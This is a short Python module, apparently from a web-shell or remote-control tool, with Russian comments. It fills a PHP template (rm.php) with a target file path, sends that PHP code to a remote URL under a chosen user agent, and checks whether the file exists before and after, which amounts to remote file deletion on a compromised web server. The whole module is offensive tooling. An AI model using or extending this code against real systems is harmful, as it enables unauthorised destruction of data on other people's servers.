import modules.send as send
import modules.exist as exist

def file(url,com,pwd,uagent):
        with open('modules\\rm\\rm.php') as f:data = f.read()
        if "/" in com: #Проверка на абсолютный путь удяляемого
            if exist.file(url,com,uagent) == "1":
                data = data.replace("$delete = $_LOCAL;", f"$delete = \'{com}\';")
                send.send(url,data,uagent)
                return exist.file(url,com,uagent)
            else:
                print("Файла не существует")
                return 0
        else:
            if exist.file(url,pwd+'/'+com,uagent) == "1":
                data = data.replace("$delete = $_LOCAL;", f"$delete = \'{pwd+'/'+com}\';")
                send.send(url,data,uagent)
                return exist.file(url,pwd+'/'+com,uagent)
            else:
                print("Файла не существует")
                return 0